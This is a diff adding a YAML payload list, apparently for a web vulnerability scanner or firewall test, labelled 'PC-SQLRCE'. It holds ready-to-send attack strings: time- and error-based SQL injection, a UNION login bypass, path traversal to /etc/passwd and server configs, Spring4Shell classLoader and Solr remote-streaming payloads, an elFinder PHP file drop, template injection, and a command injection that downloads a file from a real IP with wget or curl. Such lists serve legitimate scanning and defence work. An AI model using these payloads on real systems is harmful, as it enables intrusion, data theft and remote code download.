@@ -1,0 +1,52 @@
+---
+payload:
+  - "/mobile/recruit.html?code=011asg0w3d6Tm03YQv3w3cMWEH1asg01&state=8cf6e85c-feee-42a3-bd19-e1e7d7620030'/**/and(select'1'from/**/pg_sleep(2))::text>'0"
+  - "mobileNo=13312334455/**/and/**/2=DBMS_PIPE.RECEIVE_MESSAGE('n',0)"
+  - "mobileNo=13312334455/**/and(select+1)>0waitfor/**/delay'0:0:0'/**/"
+  - "/mobile/recruit.html?code=011asg0w3d6Tm03YQv3w3cMWEH1asg01'and(select*from(select+sleep(0))a/**/union/**/select+1)='&state=8cf6e85c-feee-42a3-bd19-e1e7d7620030"
+  - "user=a'?UNION SELECT?'admin','admin',null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,1,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null;#"
+  - "id=0||(updatexml(1,concat(0x7e,(select md5(40598)),0x7e),1))"
+  - "account=admin' and updatexml(1,concat(0x1,md5(999999999)),1) and '1'='1"
+  - "/eam/vib?id=/etc/passwd"
+  - "/admin/icons/.%2e/.62e/.%2e/.52e/.32e/./2e/.22e/wodeshijie"
+  - "com/emit/_next/..;..;..;..;../actour/wodeshijie1"
+  - "utilCmdArgs=-c wget -q http://106.246.224.219/big || curl http://106.246.224.219/big"
+  - "/emit/php/connector.minimal.php?cmd=file&download=1&target=l1_Li8vLi4vLy4uLy8uLi8vLi4vLy4uLy8uLi9ldGMvcGFzc3dk?"
+  - "account=admin' and updatexml(1,concat(0x1,md5(999999999)),1) and '1'='1"
+  - "/loan/cgi-bin/%2e22e/%2e22e//2e32e/52e32e/swagger"
+  - "/elfinder/php/connector.minimal.php?cmd=mkfile&name=2QGCd6ZTfJfwegNuC0lFdOnpYPm.php:aaa&target=l1_Lw?"
+  - "WeeklyCode=1'or user like 'dbo' and SYSTEM_USER like'lfu___"
+  - "/swagger-ui.html?"
+  - "queryString=\u0027+{714025+815865}+\u0027?"
+  - "/+cscot+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=+CSCOE+/portal_inc.lua"
+  - "/api/swagger-ui/api-docs"
+  - "/druid/index.html"
+  - "set-property.requestDispatcher.requestParsers.enableRemoteStreaming=true"
+  - "https://www.zhi-niao.com/cmi?=sys.v_$version%20where%20rownum=1"
+  - "/type.php?template=tag_(){};@unlink(file);echo?"
+  - "set-property.requestDispatcher.requestParsers.enableRemoteStreaming=true"
+  - "/hr/policymanager/policyrecord?class.module.classLoader.URLs[2]=2"
+  - "/typelist/typelist.do?cid=ssti#{%20777%20*%20777%20}"
+  - "class.module.classLoader.resources.context.configFile=https://{{interactsh-url}}"
+  - "class.module.classLoader.resources.context.configFile.content.aaa=xxx?"
+  - "/166029126761572969/..;/..;/;/env"
+  - "/..;/..;/;/actuator"
+  - "/iv/ ../web-inf/?"
+  - "/download/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e//home/jws/apps/appserver/conf"
+  - "/examples/jsp/%2e%2e/%2e%2e/manager/html/"
+  - "//lates/index.htmlusername=123'/**/and/**"
+  - "?/lates/index.htmlusername=123'/**/and/**"
+  - "/hr/user/login/..;/;/env"
+  - "?/robots.txt/..;/;/actuator"
+  - "account=admin' and updatexml(1,concat(0x1,md5(999999999)),1) and '1'='1"
+  - "/ehis-gi/hr/hrlogin/sendotp?1/'z*/**/=1&h32ohse4=1"
+  - "/ehis-gi/hr/hrlogin/sliderinit?1/'z*/**/=1&m9pkw5=1"
+  - "degreeRequired='/**/and/**/DBMS_PIPE.RECEIVE_MESSAGE('r',0)='r"
+encoder:
+  - URL
+  - Plain
+placeholder:
+  - URLPath
+  - JSONRequest
+type: "PC-SQLRCE"
+...
